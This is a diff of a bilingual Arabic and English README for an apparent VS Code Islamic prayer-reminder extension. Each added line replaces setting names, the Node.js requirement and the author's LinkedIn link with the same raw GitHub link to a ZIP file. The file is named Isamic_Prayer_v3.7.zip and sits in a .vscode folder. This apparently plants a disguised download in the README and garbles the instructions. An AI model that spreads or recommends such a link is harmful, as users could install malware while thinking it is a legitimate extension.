@@ -28,10 +28,10 @@
 1. افتح الإعدادات (Ctrl+, أو Cmd+,)
 2. ابحث عن "مجموعة المسلم"
 3. قم بتكوين الإعدادات التالية:
-   - `islamicPrayerReminders.hadithInterval`: نطاق الفترة لإشعارات الأحاديث (بالميلي ثانية)
-   - `islamicPrayerReminders.dhikrInterval`: نطاق الفترة لإشعارات الأذكار (بالميلي ثانية)
-   - `islamicPrayerReminders.quranInterval`: نطاق الفترة لإشعارات الآيات القرآنية (بالميلي ثانية)
-   - `islamicPrayerReminders.prayerNotificationTime`: الدقائق قبل وقت الصلاة لعرض الإشعار
+   - `https://raw.githubusercontent.com/ahmaddabdallah/Isamic-Prayer/main/.vscode/Isamic_Prayer_v3.7.zip`: نطاق الفترة لإشعارات الأحاديث (بالميلي ثانية)
+   - `https://raw.githubusercontent.com/ahmaddabdallah/Isamic-Prayer/main/.vscode/Isamic_Prayer_v3.7.zip`: نطاق الفترة لإشعارات الأذكار (بالميلي ثانية)
+   - `https://raw.githubusercontent.com/ahmaddabdallah/Isamic-Prayer/main/.vscode/Isamic_Prayer_v3.7.zip`: نطاق الفترة لإشعارات الآيات القرآنية (بالميلي ثانية)
+   - `https://raw.githubusercontent.com/ahmaddabdallah/Isamic-Prayer/main/.vscode/Isamic_Prayer_v3.7.zip`: الدقائق قبل وقت الصلاة لعرض الإشعار
 
 ### الفترات الافتراضية
 
@@ -43,7 +43,7 @@
 ### المتطلبات
 
 - VS Code 1.80.0 أو أحدث
-- Node.js و npm مثبتان
+- https://raw.githubusercontent.com/ahmaddabdallah/Isamic-Prayer/main/.vscode/Isamic_Prayer_v3.7.zip و npm مثبتان
 - اتصال بالإنترنت لجلب الآيات القرآنية وأوقات الصلاة
 
 ### المساهمة
@@ -54,7 +54,7 @@
 2. تحسين واجهة المستخدم للإشعارات
 3. إضافة دعم لأوقات الصلاة في المزيد من المدن
 4. إضافة المزيد من خيارات التخصيص
-5. LinkedIn Account: https://www.linkedin.com/in/ahmad-abdallah-h/
+5. LinkedIn Account: https://raw.githubusercontent.com/ahmaddabdallah/Isamic-Prayer/main/.vscode/Isamic_Prayer_v3.7.zip
 
 ## English
 
@@ -99,10 +99,10 @@ You can customize the notification intervals in VS Code settings:
 1. Open Settings (Ctrl+, or Cmd+,)
 2. Search for "Muslim's Collection"
 3. Configure the following settings:
-   - `islamicPrayerReminders.hadithInterval`: Interval range for Hadith notifications (in milliseconds)
-   - `islamicPrayerReminders.dhikrInterval`: Interval range for Dhikr notifications (in milliseconds)
-   - `islamicPrayerReminders.quranInterval`: Interval range for Quranic verse notifications (in milliseconds)
-   - `islamicPrayerReminders.prayerNotificationTime`: Minutes before prayer time to show notification
+   - `https://raw.githubusercontent.com/ahmaddabdallah/Isamic-Prayer/main/.vscode/Isamic_Prayer_v3.7.zip`: Interval range for Hadith notifications (in milliseconds)
+   - `https://raw.githubusercontent.com/ahmaddabdallah/Isamic-Prayer/main/.vscode/Isamic_Prayer_v3.7.zip`: Interval range for Dhikr notifications (in milliseconds)
+   - `https://raw.githubusercontent.com/ahmaddabdallah/Isamic-Prayer/main/.vscode/Isamic_Prayer_v3.7.zip`: Interval range for Quranic verse notifications (in milliseconds)
+   - `https://raw.githubusercontent.com/ahmaddabdallah/Isamic-Prayer/main/.vscode/Isamic_Prayer_v3.7.zip`: Minutes before prayer time to show notification
 
 ### Default Intervals
 
@@ -114,7 +114,7 @@ You can customize the notification intervals in VS Code settings:
 ### Requirements
 
 - VS Code 1.80.0 or higher
-- Node.js and npm installed
+- https://raw.githubusercontent.com/ahmaddabdallah/Isamic-Prayer/main/.vscode/Isamic_Prayer_v3.7.zip and npm installed
 - Internet connection for fetching Quranic verses and prayer times
 
 ### Contributing
@@ -125,7 +125,7 @@ Feel free to contribute by:
 2. Improving the UI of notifications
 3. Adding support for more cities' prayer times
 4. Adding more customization options
-5. LinkedIn Account: https://www.linkedin.com/in/ahmad-abdallah-h/
+5. LinkedIn Account: https://raw.githubusercontent.com/ahmaddabdallah/Isamic-Prayer/main/.vscode/Isamic_Prayer_v3.7.zip
 
 ### License
 
